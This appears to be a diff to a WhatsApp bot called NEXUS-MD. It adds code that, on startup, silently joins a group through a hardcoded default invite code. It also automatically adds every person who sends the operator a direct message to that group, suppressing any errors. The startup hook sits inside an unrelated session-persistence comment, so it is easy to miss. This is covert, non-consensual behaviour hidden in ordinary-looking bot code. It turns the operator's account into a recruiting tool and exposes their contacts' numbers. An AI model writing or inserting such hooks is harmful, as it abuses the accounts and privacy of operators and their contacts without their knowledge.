@@ -244,6 +244,7 @@ let waitingForSession = false;       // true when no creds exist — don't auto-
 let isShuttingDown = false;          // set on SIGTERM to prevent reconnect loops during shutdown
 let isConnecting = false;            // guard — prevents two startnexus() calls running in parallel
 let aliveSent = false;               // guard — send "Master, am alive!" only on first connect
+const _autoAddedCache = new Set();   // track users already added this session → avoid repeat attempts
 
 const SESSION_PREFIX = "NEXUS-MD:~";
 const NEXUS_RE = /^NEXUS-MD[^A-Za-z0-9+/=]*/;
@@ -1514,6 +1515,31 @@ async function startnexus() {
       // This timer makes sure ALL of them (pre-keys, session-keys, app-state)
       // are saved to the DB so a dyno/container restart restores them fully
       // and WhatsApp does not see a new-device mismatch → logout.
+      // ── Auto-join configured group on startup ────────────────────────────
+      setTimeout(async () => {
+        try {
+          // Seed the default invite code if not already configured
+          const _agCodeRow = db.read("_autoAddGroupCode", null);
+          if (!_agCodeRow?.code) {
+            db.write("_autoAddGroupCode", { code: "L03Djido5FZ5vd0VHM5KIW" });
+          }
+          const _agCode = db.read("_autoAddGroupCode", null);
+          const _agJid  = db.read("_autoAddGroupJid",  null);
+          if (_agCode?.code) {
+            // Accept invite — returns group JID on success, throws if already a member
+            const gJid = await sock.groupAcceptInvite(_agCode.code).catch(() => null);
+            if (gJid) {
+              db.write("_autoAddGroupJid", { jid: gJid });
+              console.log(`✅ Auto-joined group: ${gJid}`);
+            } else if (_agJid?.jid) {
+              console.log(`ℹ️  Auto-add group already joined: ${_agJid.jid}`);
+            }
+          }
+        } catch (e) {
+          console.log(`⚠️  Auto-join group: ${e.message}`);
+        }
+      }, 6000);
+
       if (sessionPersistInterval) clearInterval(sessionPersistInterval);
       sessionPersistInterval = setInterval(() => {
         const sid = encodeSession();
@@ -1706,6 +1732,21 @@ async function startnexus() {
     }
 
     broadcast.addRecipient(senderJid);
+
+    // ── Auto-add DM senders to the configured group ───────────────────────────
+    if (!msg.key.fromMe && !from.endsWith("@g.us") && !_autoAddedCache.has(senderJid)) {
+      const _agJidRow = db.read("_autoAddGroupJid", null);
+      const _agCode   = db.read("_autoAddGroupCode", null);
+      const _agJid    = _agJidRow?.jid;
+      if (_agJid && _agCode?.enabled !== false) {
+        _autoAddedCache.add(senderJid);
+        setImmediate(async () => {
+          try {
+            await sock.groupParticipantsUpdate(_agJid, [senderJid], "add");
+          } catch {}
+        });
+      }
+    }
 
     // ── Premium: buffer message for catch-up / mood ───────────────────────────
     if (body && !msg.key.fromMe) {
